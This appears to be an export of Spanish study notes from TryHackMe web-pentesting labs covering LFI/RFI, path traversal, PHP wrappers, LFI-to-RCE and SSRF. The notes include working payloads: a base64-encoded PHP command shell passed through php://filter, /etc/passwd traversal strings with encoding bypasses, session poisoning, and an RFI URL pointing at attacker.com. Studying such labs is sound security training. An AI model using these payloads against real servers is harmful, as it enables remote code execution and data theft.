    "content": "<h2>Estructura de una Aplicaci√≥n Web</h2>\nLas aplicaciones web son sistemas complejos que comprenden varios componentes que trabajan juntos para repartir una buena experiencia de usuario. En su n√∫cleo. una aplicaci√≥n web tiene dos partes principales: el frontend y el backend.\n\n1. **Frontend:** Esta es la interfaz de usuario de la aplicaci√≥n, t√≠picamente construida usando frameworks como React, Angular o Vue.js. Se comunica con el backend v√≠a APIs.\n2. **Backend:** Este componente del servidor procesa las peticiones del usuario, interact√∫a con las bases de datos y sirve informaci√≥n al frontend. Se suele desarrollar usando lenguajes como PHP, Python y JavaScript y frameworks como Node.js, Django o Laravel.\n\nUno de los aspectos fundamentales de las aplicaciones web es el modelo cliente-servidor. En este modelo, el cliente manda una petici√≥n al servidor. El backend lo procesa y manda una respuesta. El cliente y la comunicaci√≥n del servidor suele pasar a trav√©s de protocolos HTTP/HTTPS.\n\n![[Pasted image 20260124131237.png]]\n\n----------------------------------------\n<h2>Server-Side Scripting y Manejo de Archivos</h2>\nLos scripts del lado del servidor corren en el servidor y generan el contenido del frontend, el cual se manda al cliente. A contrario que los scripts del lado del cliente como JavaScript en el navegador, los scripts del lado del servidor pueden acceder al sistema de ficheros y bases de datos del servidor.\n\nEl manejo de archivos es una parte importante del server-side scripting. Las aplicaciones web suelen necesitar leer o escribir archivos del servidor. Por ejemplo, leer archivos de configuraci√≥n, guardar archivos subidos del usuario o incluir c√≥digo de otros archivos.\n\nPor ejemplo, la aplicaci√≥n de abajo incluye un archivo basado en el input del usuario.\n\n![[Pasted image 20260124131938.png]]\n\nSi este input no es correctamente validado y sanitizado, un atacante puede explotar el par√°metro vulnerable para incluir archivos maliciosos o acceder a archivos sensibles en el servidor. En este caso, el atacante podr√≠a ver los contenidos del archivo `/etc/passwd`.\n\n![[Pasted image 20260124132045.png]]",
    "modified": "2026-01-25T01:01:15"
  },
  {
    "title": "7. LFI2RCE - Wrappers",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/7-lfi2rce-wrappers/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/7. LFI2RCE - Wrappers.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "Los wrappers PHP tambi√©n pueden ser usados no s√≥lo para leer archivos sino para ejecutar c√≥digo. La clave aqu√≠ es el wrapper `php://filter` el cual habilita las transformaci√≥nes de archivos al vuelo. Toma el filtro de PHP base64, por ejemplo. Este m√©todo permite a los atacantes ejecutar c√≥digo arbitrario en el servidor usando un payload base64-encodeado.\n\nPor ejemplo, ve a `http://IP/playground.php`.\n\nUsaremos el c√≥digo PHP `<? system($_GET['cmd']); echo 'Shell done!'; ?>` como nuestro payload. El valor del payload, cuando se base64-encodea es `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`.\n\n| **Position** | **Field**        | **Value**                                                            |\n| ------------ | ---------------- | -------------------------------------------------------------------- |\n| 1            | Protocol Wrapper | php://filter                                                         |\n| 2            | Filter           | convert.base64-decode                                                |\n| 3            | Resource Type    | resource=                                                            |\n| 4            | Data Type        | data://plain/text,                                                   |\n| 5            | Encoded Payload  | PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+ |\n\nEn la tabla de arriba, `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` es la versi√≥n base64-encodeada del c√≥digo PHP. Cuando el servidor procesa esta petici√≥n, primero decodifica la string en base64 y luego ejecuta el c√≥digo PHP, permitiendo a un atacante ejecutar comandos en el servidor v√≠a el par√°metro GET \"cmd\".\n\n![[Pasted image 20260126131850.png]]\n\n>[!IMPORTANT] Es importante no incluir **&cmd=whoami** en el campo de input ya que ser√° encodeado cuando se suba el formulario. Una vez encodeado, el backend tratar√° como parte de c√≥digo base64, d√°ndote un error de secuencia inv√°lida.",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "2. File Inclusion Types",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/2-file-inclusion-types/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/2. File Inclusion Types.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Fundamentos de la Inclusi√≥n de Archivos</h2>\nUna string de traversal, com√∫nmente vista como `../` se usa en ataques de path traversal para navegar entre la estructura de directorios de un sistema de ficheros. Se usan para acceder a archivos fuera del directorio pretendido.\n\nLa ruta relativa se refiere a localizar archivos bas√°ndonos en el directorio actual. Por ejemplo `include('./folder/file.php')` implica que `file.php` est√° en un directorio llamado `folder`, que est√° en el mismo directorio que el script en ejecuci√≥n.\n\nLa ruta absoluta implica especificar la ruta completa desde el directorio `/`. Por ejemplo, `/var/www/html/folder/file.php`.\n\n---------------------------------------------\n<h2>Remote File Inclusion</h2>\nLa inclusi√≥n de archivos remotos, o RFI, es una vulnerabilidad que permite a los atacantes incluir archivos remotos, normalmente mediante manipulaci√≥n de input. Esto puede llevar a ejecuci√≥n de scripts o c√≥digo maliciosos en el servidor.\n\nT√≠picamente, RFI ocurre en aplicaciones que incluyen contenido externo de forma din√°mica. Los atacantes pueden manipular par√°metros en una petici√≥n para apuntar a archivos externos maliciosos. Por ejemplo, si una aplicaci√≥n web usa una URL en un par√°metro GET como `include.php?page=http://attacker.com/exploit.php`, un atacante podr√≠a reemplazar la URL con la ruta a un script malicioso.\n\n----------------------------------------------\n<h2>Local File Inclusion</h2>\nLa inclusi√≥n de archivos locales, o LFI, ocurre cuando un atacante explota un campo de input vulnerable para acceder o ejecutar archivos en el servidor. Los atacantes normalmente explotan campos de input poco sanitizados para manipular rutas, intentando acceder a archivos fuera del directorio pretendido. Por ejemplo, usando una string de path traversal, un atacante puede acceder a archivos sensibles como `include.php?page=../../../../etc/passwd`.\n\nAunque LFI suele llevar a acceso no autorizado a archivos, puede escalar a RCE. Esto puede ocurrir si un atacante puede subir o inyectar c√≥digo en un archivo que luego se incluye o se ejecuta. T√©cnicas como log poisoning, que significa inyectar c√≥digo en los archivos de registro y luego incluir esos archivos, son ejemplos de como LFI puede llevar a RCE.\n\n-------------------------------------\n<h2>RFI vs LFI (Proceso de Explotaci√≥n)</h2>\n![[Pasted image 20260124160248.png]]\n\nEste diagrama diferencia el proceso de explotar vulnerabilidades RFI y LFI. En RFI, el foco est√° en incluir y ejecutar archivos remotos, mientras que en LFI, el atacante intenta acceder a archivos locales y potencialmente usar esto para acceder a ejecutar c√≥digo en el servidor.",
    "modified": "2026-01-25T01:01:15"
  },
  {
    "title": "0. File Inclusion and Path Traversal",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/0-file-inclusion-and-path-traversal/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/0. File Inclusion and Path Traversal.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "[[1. Web Application Architecture]]\n[[2. File Inclusion Types]]\n[[3. PHP Wrappers]]\n[[4. Base Directory Breakouts]]\n[[5. LFI2RCE - Session Files]]\n[[6. LFI2RCE - Log Poisoning]]\n[[7. LFI2RCE - Wrappers]]",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "4. Base Directory Breakouts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/4-base-directory-breakouts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/4. Base Directory Breakouts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Salida del Directorio Base</h2>\nEn las aplicaciones web, los sistemas de seguridad se ponen para evitar ataques de path traversal. Sin embargo estas defensas no siempre son a prueba de todo. Debajo est√° el c√≥digo de una aplicaci√≥n que insiste en que el nombre de archivo dado por el usuario debe comenzar con un directorio base predeterminado y tambi√©n dividir√° las strings de traversal para proteger la aplicaci√≥n de ataques de file traversal:\n\n```php\nfunction containsStr($str, $subStr){\n    return strpos($str, $subStr) !== false;\n}\n\nif(isset($_GET['page'])){\n    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){\n        include $_GET['page'];\n    }else{ \n        echo 'You are not allowed to go outside /var/www/html/ directory!';\n    }\n}\n```\n\nEs posible cumplir con estos requerimientos y navegar a otros directorios. Esto puede ser conseguido a√±adiendo las secuencias de directory traversal despu√©s del archivo base.\n\nPor ejemplo, ve a `http://IP/lfi.php` y usa el payload `/var/www/html/..//..//..//etc/passwd`.\n\nLa funci√≥n PHP `constrainsStr` comprueba si unasubstring existe en una string. La condici√≥n if comprueba dos cosas. Primero, si `$_GET['page']` no contiene la substring `../..`, y si `$_GET['page']` contiene la substring `/var/www/html`. Sin embargo, `..//..//` bypassea este filtro porque navega dos directorios hacia arriba, como `../../`. No coincide, sin embargo, exactamente con el patr√≥n bloqueado `../..` debido a las `/` extra.\n\n![[Pasted image 20260126123725.png]]\n\n-------------------------------------\n<h2>Ofuscaci√≥n</h2>\nLas t√©cnicas de ofuscaci√≥n son normalmente usadas para bypassear filtros de seguridad b√°sicos que puedan tener las aplicaciones. Estos filtros suelen buscar secuencias obvias de directory traversal como `../`. Sin embargo, los atcantes pueden evadir la detecci√≥n de estas srtings ofusc√°ndolas.\n\nEl encodeo transforma caracteres a un formato diferente. En LFI, los atacantes suelen usar URL encoding, donde los caracteres se representan usando s√≠mbolos de porcentaje seguidos de valores hexadecimales. Por ejemplo, `../` puede encodearse de varias maneras:\n\n- **Encoding URL Est√°ndar:** `../` se convierte en `%2e%2e%2f`.\n- **Doble Encoding:** √ötil si la aplicaci√≥n decodifica el input 2 veces. `../` se convierte en `%252e%252e%252f`.\n- **Ofuscaci√≥n:** Los atacantes pueden usar payloads como `....//`, lo que puede ayudar a evitar la detecci√≥n mediante coincidencia de string o mecanismos de filtrado. Esta t√©cnica de ofuscaci√≥n pretende ocultar los intentos de directory traversal, haci√©ndolos menos obvios para filtros b√°sicos.\n\nPor ejemplo, imagina una aplicaci√≥n que mitiga LFI filtrando `../`:\n\n```php\n$file = $_GET['file'];\n$file = str_replace('../', '', $file);\n\ninclude('files/' . $file);\n```\n\nUn atacante puede potencialmente sobrepasar este filtro usando los siguientes m√©todos.\n\n1. **URL Encoded Bypass:** El atacante usa la versi√≥n URL-encodeada del payload como `?file=%2e%2e%2fconfig.php`. El servidor decodea este input a `../config.php`.\n2. **Double Encoded Bypass:** El atacante puede usar doble encoding si la aplicaci√≥n decodea el input dos veces. El payload ser√≠a `?file=%252e%252e%252fconfig.php`, donde hay un punto es `%252e` y donde hay una barra es `%252f`.\n3. **Obfuscation:** Un atacante podr√≠a usar el payload `....//config.php` lo que despu√©s de aplicar los filtros de la aplicaci√≥n se convierte en `../config.php`.",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "3. PHP Wrappers",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/3-php-wrappers/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/3. PHP Wrappers.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "Los wrappers PHP son parte de la funcionalidad de PHP que permite a los usuarios acceder a varios flujos de datos. Los wrappers tambi√©n pueden acceder o ejecutar c√≥digo a trav√©s de protocolos PHP, lo que puede llevar a riesgos de seguridad importantes.\n\nPor ejemplo, una aplicaci√≥n vulnerable a LFI puede incluir archivos basado en input dado por el usuario sin validaci√≥n suficiente. En dichos casos, los atacantes pueden usar el filtro `php://filter`. Este filtro permite a un usuario realizar operaciones de modificaci√≥n b√°sicas sobre la informaci√≥n antes de que se lea o escriba. Por ejemplo, si un atacante quiere encodear el contenido de un archivo como `/etc/passwd` en base64. Esto lo puede conseguir usando el filtro de conversi√≥n `conver.base64-encode` del wrapper. El payload final ser√≠a `php://filter/conver.base64-encode/resource=/etc/passwd`.\n\nPor ejemplo, ve a `http://IP/playground.php` u usa el payload final all√≠.\n\n![[Pasted image 20260125144453.png]]\n\nUna vez que la aplicaci√≥n procese este payload, el servidor devolver√° el contenido encodeado de **passwd**.\n\n![[Pasted image 20260125144530.png]]\n\nEl atacante puede decodearlo despu√©s.\n\n![[Pasted image 20260125144545.png]]\n\nHay muchas categor√≠as de filtros en PHP. Algunos son **Filtros de String** (`string.rot13`, `string.toupper`, `string.tolower` y `string.strip_tags`), **Filtros de Conversi√≥n** (`convert.base64-encode`, `convert.base64-decode`, `convert.quoted-printable-encode` y `convert.quoted-printable-decode`), **Filtros de Compresi√≥n** (`zlib.deflate` y `zlib.inflate`) y **Filtros de Encriptaci√≥n** (`mcrypt` y `mdecrypt`).\n\nPor ejemplo, la tabla de abajo representa el output del archivo **.htaccess** usando diferentes filtros de string:\n\n| **Payload**                                           | **Output**                                   |\n| ----------------------------------------------------- | -------------------------------------------- |\n| php://filter/convert.base64-encode/resource=.htaccess | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |\n| php://filter/string.rot13/resource=.htaccess          | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf            |\n| php://filter/string.toupper/resource=.htaccess        | REWRITEENGINE ON OPTIONS -INDEXES            |\n| php://filter/string.tolower/resource=.htaccess        | rewriteengine on options -indexes            |\n| php://filter/string.strip_tags/resource=.htaccess     | RewriteEngine on Options -Indexes            |\n| No filter applied                                     | RewriteEngine on Options -Indexes            |\n\n-----------------------------------------------\n<h2>Data Wrapper</h2>\nEl wrapper de flujo de informaci√≥n es otro ejemplo de la funcionalidad de wrappers de PHP. El wrapper `data://` permite la incrustaci√≥n de informaci√≥n en la propia linea. Se usa para incrustar peque√±as cantidades de informaci√≥n directamente en el c√≥digo de la aplicaci√≥n.\n\nPor ejemplo, ve a `http://IP/playground.php` y usa el payload `data:text/plain,<?php%20phpinfo();%20?>`. En la imagen de abajo esta URL podr√≠a causar ejecuci√≥n de c√≥digo PHP, mostrando los detalles de su configuraci√≥n.\n\n![[Pasted image 20260125145344.png]]\n\nEl desglose del payload `data:text/plain,<?php phpinfo(); ?>` es:\n\n- `data:` Como URL.\n- `mime-type`: Configurada como `text/plain`.\n- La parte de los datos incluye una traza de c√≥digo PHP: `<?php phpinfo(); ?>`.",
    "modified": "2026-01-26T01:00:07"
  },
  {
    "title": "5. LFI2RCE - Session Files",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/5-lfi2rce-session-files/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/5. LFI2RCE - Session Files.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Archivos de Sesi√≥n PHP</h2>\nLos archivos de sesi√≥n PH tambi√©n pueden ser usados en un ataque LFI, llevando a RCE, particularmente si un atacante puede manipular la informaci√≥n de sesi√≥n. En una aplicaci√≥n web t√≠pica, la informaci√≥n de sesi√≥n se guarda en archivos en el servidor. Si un atacante puede inyectar c√≥digo malicioso en estos archivos de sesi√≥n y si la aplicaci√≥n incluye estos archivos mediante una vulnerabilidad LFI, esto puede llevar a RCE.\n\nPor ejemplo, la aplicaci√≥n vulnerable hosteada en `http://IP/sessions.php` contiene el siguiente c√≥digo:\n\n```php\nif(isset($_GET['page'])){\n    $_SESSION['page'] = $_GET['page'];\n    echo \"You're currently in\" . $_GET[\"page\"];\n    include($_GET['page']);\n}\n```\n\nUn atacante podr√≠a explotar esta vulnerabilidad inyectando c√≥digo PHP en su variable de sesi√≥n usando `<? echo phpinfo(); ?>` en el par√°metro de la p√°gina.\n\n![[Pasted image 20260126130003.png]]\n\nEl c√≥digo es guardado en el archivo de sesi√≥n del servidor. Por ello, el atacante puede usar la vulnerabilidad LFI para incluir este archivo de sesi√≥n. Como los IDs de sesi√≥n son hasheados, el ID puede ser encontrado en las cookies del navegador.\n\n![[Pasted image 20260126130114.png]]\n\nAcceder a la URL `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]` ejecutar√° el c√≥digo PHP inyectado en el archivo de sesi√≥n.\n\n![[Pasted image 20260126130501.png]]",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "1. Redirection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/6-include/1-redirection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/6. Include/1. Redirection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 6. Include",
    "content": "Para ver este curso ve a **THM -> Maquinas/2. Medium -> 7. Include -> 1. Getting the Flags**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Include",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/6-include/0-include/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/6. Include/0. Include.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 6. Include",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/0. Include]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/6. Include/1. Redirection]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Types of SSRF - Basic",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/3-types-of-ssrf-basic/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/3. Types of SSRF - Basic.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "El SSRF b√°sico es una t√©cnica de ataque web donde un atacante enga√±a al servidor para que haga peticiones en su ppropio nombre, normalmente a sistemas internos o a servicios de terceros. Explotando las vulnerabilidades en la validaci√≥n de input, el atacante puede ganar acceso no autorizado a informaci√≥n sensible o control sobre recursos remostos.\n\nUn SSRF b√°sico puede emplearse contra un servidor local o interno. exploraremos ambos escenarios en detalle.\n\n----------------------------------------\n<h2>Escenario 1: SSRF Contra un Servidor Local</h2>\n\nEn este ataque, el atacante hace una petici√≥n no autorizada al servidor que hostea la aplicaci√≥n web. El atacante da una direcci√≥n IP loopback o localhost para obtener la respuesta. La vulnerabilidad surge debido a c√≥mo la aplicaci√≥n maneja el input para formar la query o llamada a la API.\n\nPor ejemplo, en la aplicaci√≥n HRMS, hay una funcionalidad que carga p√°ginas adicionales basado en un par√°metro URL. Por ejemplo, navegar a `http://hrms.thm?url=localhost/copyright` cargar√≠a una p√°gina de copyright de la aplicaci√≥n. Esta funcionalidad est√° hecha para uso interno y est√° dise√±ada para pedir y mostrar p√°ginas del servidor local (usando por ello `localhost` en la query).\n\nSin embargo, debido a validaci√≥n insuficiente en el input URL, un atacante puede manipular esta funcionalidad para hacer un ataque SSRF. Cambiando el par√°metro de la URL para apuntar a otra p√°gina/servicio, el atacante puede forzar que el servidor HRMS haga peticiones a donde √©l quiera. Por ejemplo, si el atacante usa una URL como `http://hrms.thm/?url=localhost/config` y `config` es una p√°gina v√°lida, el servidor HRMS intentar√° cargar el contenido de esta p√°gina y cargar el resultado..\n\nLa idea principal es suplantar una petici√≥n leg√≠tima y hacer que el servidor realice una aci√≥n que no deber√≠a.\n\n<h4>C√≥mo Funciona</h4>\n- Sup√≥n que te han mandado hacer un pentest en el sitio web HRMS e identificar cualquier agujero de SSRF que veas. Visita el sitio web `http://hrms.thm` y ver√°s que la p√°gina de login est√° protegida mediante un usuario y contrase√±a.\n  ![[Pasted image 20260122133737.png]]\n- Vemos que una vez que visitamos la p√°gina `http://hrms.thm`, autom√°ticamente nos redirige a `http://hrms.thm/?url=localhost/copyright`. La p√°gina web muestra el estado del copyright de la web.\n  ![[Pasted image 20260122133829.png]]\n- Esto significa que el desarrollador probablemente ha incurrido en algunos errores al manejar un archivo que muestra el estado del copyright. Aqu√≠ est√° el c√≥digo de la p√°gina que toma los par√°metros.\n\n```php\n$uri = rtrim($_GET['url'], \"/\");\n...\t\t\t\t\t\n$path = ROOTPATH . $file;\n...\nif (file_exists($path)) {\n  echo \"<pre>\";\n  echo htmlspecialchars(file_get_contents($path));\n  echo \"</pre>\";\n  } else { ?>\n    <p class=\"text-xl\"><?= ltrim($file, \"/\") ?> is not found</p>\n <?php\n... \n```\n\n- Podemos ver que en el c√≥digo de arrina el par√°metro `url` no tiene el filtrado adecuado y carga lo que el par√°metro le pase desde `localhost`.\n- Intentaremos cambiar la URL a `http://hrms.thm/?url=localhost/hello`. Muestra un error: `hello.php is not found`.\n  ![[Pasted image 20260122134059.png]]\n- As√≠ que la p√°gina llama a un archivo PHP y lo muestra en el footer de la p√°gina actual. ¬øQu√© pasa si llamamos a archivos sensibles como `connection.php` o `config.php`?\n- Cuando intentamos acceder al archivo `http://hrms.thm/?url=localhost/config`, veremos que el footer muestra el contenido de esta p√°gina.\n\n```php\n<?php \n$adminURL = \"xxxxxxx\";\n$username = \"xxxxx\"; \n$password = \"xxxx\"; \n...\n?>\n```",
    "modified": "2026-01-23T00:56:08"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "El marco de los ataques web evoluciona constantemente con m√©todos m√°s sofisticados de comprometer sistemas. Cada d√≠a que pasa, la expansi√≥n de las amenazas basadas en web, garantiza la necesidad de medidas de ciberseguridad robusta para contrarestar estas t√°cticas empleadas. En esta unidad exploraremos un tipo de ataque conocido como **Server Side Request Forgery (SSRF)**.\n\nSSRF es una vulnerabilidad de aplicaci√≥n web que permite al atacante forzar al servidor a hacer peticiones no autorizadas a cualquier fuente local o externa en nombre del servidor. SSRF permite a un atacante interactuar con sistemas internos, llevando potencialmente a filtraci√≥n de informaci√≥n o incluso RCE.\n\n-------------------------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Entender c√≥mo funciona SSRF.\n- Probar varios tipos de SSRF.\n- Herramientas importantes para la explotaci√≥n.\n- Medidas de mitigaci√≥n y defensa claves.\n\n-----------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n- [[0. Protocols and Servers]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]",
    "modified": "2026-01-23T00:56:08"
  },
  {
    "title": "4. Types of SSRF - Basic - continued",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/4-types-of-ssrf-basic-continued/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/4. Types of SSRF - Basic - continued.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "En esta tarea vamos a continuar aprendiendo sobre t√©cnicas b√°sicas de SSRF.\n\n----------------------------------------\n<h2>Escenario 2: Acceder a un Servidor Interno</h2>\nEn aplicaciones web complejas, es com√∫n para las aplicaciones front-end interactuar con servidores back-end internos. Estos servidores suelen estar hosteados en direcciones IP no ruteables, por lo que un usuario de internet no puede acceder a ellos. En este contexto, un atacante explota la validaci√≥n del input vulnerable de la web para enga√±ar al servidor para que mande peticiones internas a recursos en la misma red.\n\nPor ejemplo, si un servidor interno ofrece manejo de base de datos o controles administrativos, el atacante podr√≠a construir una URL que inicie una acci√≥n no deseada en estos sistemas internos. T√©cnicamente se consigue a trav√©s de input manipulado, como direcciones IP especiales (como `192.168.x.x` o `10.x.x.x` para IPv4) o nombres de dominio (por ejemplo `internal-database.hrms.thm`).\n\nAdem√°s, como estos servidores internos pueden estar faltos del mismo nivel de seguridad y monitorizaci√≥n que los servidores externos, dicha explotaci√≥n puede no ser vista. El atacante puede usar tambi√©n este m√©todo para realizar reconocimiento en la red interna, identificando otros objetivos o sistemas vulnerables.\n\n<h4>C√≥mo Funciona</h4>\n- En este caso, trataremos de acceder a recursos internos inaccesibles a trav√©s de peticiones directas.\n- Ahora que hemos adquirido las credenciales del panel de login, vamos a iniciar sesi√≥n en la dashboard.\n- Una vez logueados en la app HRMS, veremos un dashboard que lista empleados y sus departamentos. Hay un men√∫ que muestra los datos de los empleados y su salario.\n  ![[Pasted image 20260122222157.png]]\n- Desde el archivo de configuraci√≥n, podemos ver que el panel de admin est√° hosteado en `http://192.168.2.10/admin.php`. Si intentamos loguearnos no es accesible directamente.\n  ![[Pasted image 20260122222313.png]]\n- No tenemos ruta a esa IP ya que forma parte de una red privada y s√≥lo puede ser accedida por una m√°quina en la misma red.\n- Si comprobamos el c√≥digo fuente de HTML, muestra que el men√∫ toma la URL de un sistema interno y renderiza la informaci√≥n. Los detalles de toos los empleados se trasfieren de `http://192.168.2.10/employees.php`.\n  ![[Pasted image 20260123100445.png]]\n- Vale, vemos que el men√∫ desplegable accede a un sistema interno. ¬øQu√© pasa si intentamos cambiar la petici√≥n de tal forma que en vez de cargar la p√°gina de empleados mandamos `http://192.168.2.10/admin.php`?\n  ![[Pasted image 20260123100610.png]]\n- Una vez actualizado el valor, elegimos `Salary` del men√∫ desplegable `Select Category`.\n  ![[Pasted image 20260123100824.png]]\n- Ah√≠ lo tenemos, el panel que antes era inaccesible.\n  ![[Pasted image 20260123100844.png]]",
    "modified": "2026-01-24T00:53:46"
  },
  {
    "title": "5. Types of SSRF - Blind",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/5-types-of-ssrf-blind/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/5. Types of SSRF - Blind.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "La SSRF blind se refiere a un escenario donde el atacante puede mandar peticiones al servidor objetivo pero no recibe una respuesta directa o feedback sobre el resultado de sus peticiones.  Este tipo de SSRF puede ser m√°s dif√≠cil de explotar debido a que el atacante no ve directamente el resultado de sus acciones.\n\n-----------------------------------------------\n<h2>Blind SSRF con Out-Of-Band</h2>\nLa SSRF OOB es una t√©cnica dnde el atacante usa diferentes canales de comunicaci√≥n en lugar de recibir respuestas por el mismo canal.\n\nPor ejemplo, el atacante puede manipular el servidor vulnerable para hacer una petici√≥n DNS a un domminio controlado por √©l. Esta interacci√≥n externa ofrece al atacante evidencia de que una vulnerabilidad SSRF existe y potencialmente le permite recolectar informaci√≥n como IPs internas y estructura de red.\n\n<h4>C√≥mo Funciona</h4>\n- Una vez m√°s, inicia sesi√≥n en el dashboar en la pesta√±a `Profile`. Veremos que nos redirige a `http://hrms.thm/profile.php?url=localhost/getInfo.php`, lo que muestra un mensaje de que la informaci√≥n se est√° mandando.\n  ![[Pasted image 20260123112505.png]]\n- ¬øQu√© est√° pasando aqu√≠? Una vez que cargamos `profile.php`, manda la informaci√≥n a una p√°gina externa llamada `getInfo.php`, lo que es probablemente usado para anal√≠ticas o registros.\n\n```php\n<?php\n...\n$targetUrl = $_GET['url'];\nob_start();\nob_start();\nphpinfo();\n$phpInfoData = ob_get_clean();\n$ch = curl_init($targetUrl); \ncurl_setopt($ch, CURLOPT_POST, 1);\ncurl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 